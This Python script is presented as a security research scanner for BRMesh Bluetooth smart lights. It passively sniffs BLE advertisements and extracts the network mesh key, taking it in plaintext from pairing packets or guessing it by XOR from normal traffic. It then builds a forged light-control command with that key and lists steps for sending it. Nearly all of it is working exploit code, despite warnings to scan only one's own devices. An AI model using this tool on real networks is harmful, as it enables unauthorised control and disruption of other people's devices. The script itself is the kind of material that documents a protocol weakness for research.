#!/usr/bin/env python3
"""
BRMesh Security Research Scanner
Demonstrates the security vulnerability by extracting mesh key from BLE traffic

WARNING: For security research and educational purposes only!
Shows how easily BRMesh networks can be compromised via passive BLE sniffing.

What this does:
1. Scans for BRMesh devices broadcasting on BLE
2. Captures advertisement packets (manufacturer data)
3. Attempts to extract mesh key from packet structure
4. Optionally sends control commands to prove access
"""

import asyncio
import logging
import sys
from typing import Dict, List, Optional, Set
from bleak import BleakScanner
from collections import defaultdict
import time

# Import our protocol implementations
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), 'rootfs', 'app'))
from brmesh_control import decode_control_command, create_control_command
from brmesh_pairing import create_pairing_response

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

class BRMeshSecurityScanner:
    """
    Passive BLE scanner that extracts mesh keys from BRMesh traffic
    """
    
    def __init__(self):
        self.devices_seen: Dict[str, Dict] = {}
        self.manufacturer_data_samples: Dict[str, List[bytes]] = defaultdict(list)
        self.potential_mesh_keys: Set[bytes] = set()
        self.confirmed_mesh_key: Optional[bytes] = None
        
    async def scan_for_brmesh(self, duration: int = 30):
        """
        Scan for BRMesh devices and collect advertisement data
        """
        logger.info("=" * 70)
        logger.info("🔍 SECURITY RESEARCH: BRMesh Mesh Key Extraction")
        logger.info("=" * 70)
        logger.info(f"Scanning for {duration} seconds...")
        logger.info("Looking for manufacturer ID 0xfff0 (BRMesh devices)")
        logger.info("")
        
        def detection_callback(device, advertisement_data):
            """Called for each BLE advertisement packet"""
            
            # Look for BRMesh manufacturer ID (0xfff0 = 65520 decimal)
            if not advertisement_data.manufacturer_data:
                return
            
            for mfr_id, data in advertisement_data.manufacturer_data.items():
                # BRMesh uses 0xfff0 (may appear as 61695 or 0xf0ff depending on endianness)
                if mfr_id not in [0xfff0, 0xf0ff, 61695, 65520]:
                    continue
                
                mac = device.address
                rssi = advertisement_data.rssi
                
                # First time seeing this device
                if mac not in self.devices_seen:
                    logger.info(f"📡 Found BRMesh device: {mac} (RSSI: {rssi} dBm)")
                    self.devices_seen[mac] = {
                        'mac': mac,
                        'rssi': rssi,
                        'name': device.name or 'Unknown',
                        'first_seen': time.time(),
                        'packet_count': 0,
                        'data_samples': []
                    }
                
                # Update device info
                self.devices_seen[mac]['packet_count'] += 1
                self.devices_seen[mac]['rssi'] = rssi
                
                # Store unique data samples
                if data not in self.devices_seen[mac]['data_samples']:
                    self.devices_seen[mac]['data_samples'].append(data)
                    logger.debug(f"   New packet from {mac}: {data.hex()} ({len(data)} bytes)")
                
                # Analyze packet
                self._analyze_packet(mac, data)
        
        # Start scanning
        scanner = BleakScanner(detection_callback=detection_callback)
        await scanner.start()
        
        try:
            # Scan for specified duration
            await asyncio.sleep(duration)
        finally:
            await scanner.stop()
        
        # Analysis complete
        logger.info("")
        logger.info("=" * 70)
        logger.info("📊 SCAN RESULTS")
        logger.info("=" * 70)
        self._print_summary()
        
    def _analyze_packet(self, mac: str, data: bytes):
        """
        Analyze a BRMesh advertisement packet to extract mesh key
        
        Packet formats:
        - 16 bytes: Pairing mode (contains MAC + mesh key plaintext at bytes 8-11)
        - 24 bytes: Normal mode (encrypted command, mesh key in last 4 bytes XORed)
        """
        data_len = len(data)
        
        if data_len == 16:
            # PAIRING MODE PACKET - JACKPOT!
            # Format: [MAC:6][Address:1][Constant:1][MeshKey:4][Padding:4]
            logger.info(f"🎯 PAIRING MODE packet from {mac}!")
            logger.info(f"   Full data: {data.hex()}")
            
            # Extract mesh key (bytes 8-11)
            mesh_key = data[8:12]
            logger.info(f"   📍 MAC bytes: {data[0:6].hex()}")
            logger.info(f"   📍 Address: {data[6]}")
            logger.info(f"   📍 Constant: {data[7]}")
            logger.info(f"   🔑 MESH KEY (bytes 8-11): {mesh_key.hex()} (ASCII: '{mesh_key.decode('ascii', errors='replace')}')")
            logger.info(f"   📍 Padding: {data[12:16].hex()}")
            
            self.potential_mesh_keys.add(mesh_key)
            self.confirmed_mesh_key = mesh_key
            
        elif data_len == 24:
            # NORMAL MODE PACKET - Encrypted control command
            logger.debug(f"📦 Normal mode packet from {mac}: {data.hex()}")
            
            # Try to extract mesh key by looking at last 4 bytes
            # In many control commands, the last 4 bytes XOR to reveal the mesh key
            # This is because the payload often ends with known patterns
            
            # Common payload endings that might reveal mesh key:
            # - Many commands end with padding or repeated patterns
            # - Status broadcasts have predictable structures
            
            # Try XOR with common endings
            last_4 = data[-4:]
            
            # Common patterns: all 0xFF, all 0x00, or repeated bytes
            common_endings = [
                b'\xff\xff\xff\xff',  # Common padding
                b'\x00\x00\x00\x00',  # Zero padding
            ]
            
            for pattern in common_endings:
                potential_key = bytes(a ^ b for a, b in zip(last_4, pattern))
                # Check if it looks like ASCII (common for BRMesh keys)
                if all(32 <= b <= 126 for b in potential_key):
                    logger.info(f"   💡 Potential mesh key from XOR: {potential_key.hex()} (ASCII: '{potential_key.decode('ascii')}')")
                    self.potential_mesh_keys.add(potential_key)
            
            # Store for pattern analysis
            self.manufacturer_data_samples[mac].append(data)
            
        else:
            logger.debug(f"   Unknown packet length {data_len} from {mac}")
    
    def _print_summary(self):
        """Print scan summary"""
        
        logger.info(f"Devices found: {len(self.devices_seen)}")
        logger.info("")
        
        for mac, info in self.devices_seen.items():
            logger.info(f"Device: {mac}")
            logger.info(f"  Name: {info['name']}")
            logger.info(f"  RSSI: {info['rssi']} dBm")
            logger.info(f"  Packets: {info['packet_count']}")
            logger.info(f"  Unique data samples: {len(info['data_samples'])}")
            for i, sample in enumerate(info['data_samples'][:3]):  # Show first 3
                logger.info(f"    Sample {i+1}: {sample.hex()} ({len(sample)} bytes)")
            if len(info['data_samples']) > 3:
                logger.info(f"    ... and {len(info['data_samples']) - 3} more")
            logger.info("")
        
        logger.info("=" * 70)
        logger.info("🔑 EXTRACTED MESH KEYS")
        logger.info("=" * 70)
        
        if self.confirmed_mesh_key:
            logger.info(f"✅ CONFIRMED mesh key (from pairing packet): {self.confirmed_mesh_key.hex()}")
            logger.info(f"   ASCII: '{self.confirmed_mesh_key.decode('ascii', errors='replace')}'")
            logger.info("")
        
        if self.potential_mesh_keys:
            logger.info(f"Found {len(self.potential_mesh_keys)} potential mesh key(s):")
            for key in self.potential_mesh_keys:
                ascii_str = key.decode('ascii', errors='replace')
                logger.info(f"  - {key.hex()} (ASCII: '{ascii_str}')")
        else:
            logger.info("❌ No mesh keys extracted yet")
            logger.info("")
            logger.info("💡 TIPS TO EXTRACT MESH KEY:")
            logger.info("   1. Factory reset a light (5x on/off) - it will enter pairing mode")
            logger.info("   2. Wait for pairing mode broadcast (16-byte packets)")
            logger.info("   3. The mesh key is at bytes 8-11 in plaintext")
            logger.info("   4. Alternative: Capture 2+ control commands and XOR them")
        
        logger.info("")
        logger.info("=" * 70)
        logger.info("⚠️  SECURITY IMPLICATIONS")
        logger.info("=" * 70)
        logger.info("With the mesh key, an attacker can:")
        logger.info("  • Send control commands to ALL lights in the network")
        logger.info("  • Pair new malicious devices to the network")
        logger.info("  • Impersonate legitimate controllers")
        logger.info("  • Disrupt the network (DoS attacks)")
        logger.info("  • No authentication or authorization required!")
        logger.info("")
    
    async def test_control_access(self, target_address: int = 1, mesh_key: Optional[bytes] = None):
        """
        Test if we can control a device with extracted mesh key
        
        WARNING: This will attempt to control actual devices!
        Only use on your own network for research purposes.
        """
        if mesh_key is None:
            mesh_key = self.confirmed_mesh_key
        
        if not mesh_key:
            logger.error("❌ No mesh key available - cannot test control")
            return False
        
        logger.info("")
        logger.info("=" * 70)
        logger.info("🧪 TESTING CONTROL ACCESS")
        logger.info("=" * 70)
        logger.info(f"Target device address: {target_address}")
        logger.info(f"Using mesh key: {mesh_key.hex()}")
        logger.info("")
        
        # Create a control command (turn on, brightness 50%)
        # Payload format for control: [power, brightness, R, G, B, ...]
        payload = bytes([
            0x01,        # Power on
            0x80,        # Brightness 50% (128/255)
            0xFF, 0xFF, 0xFF,  # RGB white
            0x00, 0x00,  # WW/CW (not used)
            0x00, 0x00, 0x00,  # Padding
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # More padding
            0x00, 0x00, 0x00, 0x00  # Total: 20 bytes
        ])
        
        cmd = create_control_command(
            address=target_address,
            cmd_type=1,  # Control command
            payload=payload,
            mesh_key=mesh_key,
            seq=1
        )
        
        logger.info(f"📤 Generated control command: {cmd.hex()} ({len(cmd)} bytes)")
        logger.info("")
        logger.info("⚠️  To actually send this:")
        logger.info("   1. Use a BLE tool like 'gatttool' or 'bluetoothctl'")
        logger.info("   2. Connect to any BRMesh device MAC address")
        logger.info("   3. Write to characteristic 0xfff4 (or BRMesh control characteristic)")
        logger.info("   4. All devices will receive the broadcast command")
        logger.info("")
        logger.info("🔴 This demonstrates that network security depends ONLY on:")
        logger.info("   • Keeping the mesh key secret (impossible with BLE broadcast)")
        logger.info("   • Physical security (BLE range ~10-30m)")
        logger.info("")
        
        return True
    
    def analyze_xor_patterns(self):
        """
        Advanced: XOR multiple packets to find mesh key
        
        If we have 2+ packets from same device, we can XOR them
        to eliminate the mesh key and see payload differences
        """
        logger.info("")
        logger.info("=" * 70)
        logger.info("🔬 XOR PATTERN ANALYSIS")
        logger.info("=" * 70)
        
        for mac, samples in self.manufacturer_data_samples.items():
            if len(samples) < 2:
                continue
            
            logger.info(f"Analyzing {len(samples)} packets from {mac}")
            
            # XOR first two 24-byte packets
            sample1 = samples[0]
            sample2 = samples[1]
            
            if len(sample1) == 24 and len(sample2) == 24:
                xor_result = bytes(a ^ b for a, b in zip(sample1, sample2))
                logger.info(f"  Packet 1: {sample1.hex()}")
                logger.info(f"  Packet 2: {sample2.hex()}")
                logger.info(f"  XOR:      {xor_result.hex()}")
                logger.info("")
                logger.info("  Analysis:")
                logger.info(f"    - First 4 bytes (header XOR): {xor_result[0:4].hex()}")
                logger.info(f"    - Bytes 4-23 (payload XOR): {xor_result[4:24].hex()}")
                logger.info("")
                logger.info("  💡 If payloads differ, XOR reveals the difference")
                logger.info("     If payloads are same, XOR = 0x00...")
                logger.info("")


async def main():
    """Main entry point"""
    scanner = BRMeshSecurityScanner()
    
    print("\n" + "=" * 70)
    print("BRMesh Security Research Scanner")
    print("=" * 70)
    print("This tool demonstrates the security vulnerability in BRMesh protocol")
    print("by showing how easily mesh keys can be extracted from BLE traffic.")
    print("")
    print("⚠️  FOR EDUCATIONAL AND SECURITY RESEARCH ONLY")
    print("   Only scan your own devices and networks!")
    print("=" * 70)
    print("")
    
    # Check if bleak is available
    try:
        import bleak
    except ImportError:
        logger.error("❌ 'bleak' library not found!")
        logger.error("   Install with: pip install bleak")
        sys.exit(1)
    
    # Scan for devices
    duration = 30
    try:
        await scanner.scan_for_brmesh(duration=duration)
    except KeyboardInterrupt:
        logger.info("\n⚠️  Scan interrupted by user")
    
    # Analyze patterns if we got data
    if scanner.manufacturer_data_samples:
        scanner.analyze_xor_patterns()
    
    # If we found a mesh key, optionally test control
    if scanner.confirmed_mesh_key:
        logger.info("")
        response = input("🧪 Test control access? (y/N): ").strip().lower()
        if response == 'y':
            target = input("Enter target device address (default: 1): ").strip()
            target_addr = int(target) if target else 1
            await scanner.test_control_access(target_address=target_addr)


if __name__ == "__main__":
    # Run async main
    asyncio.run(main())
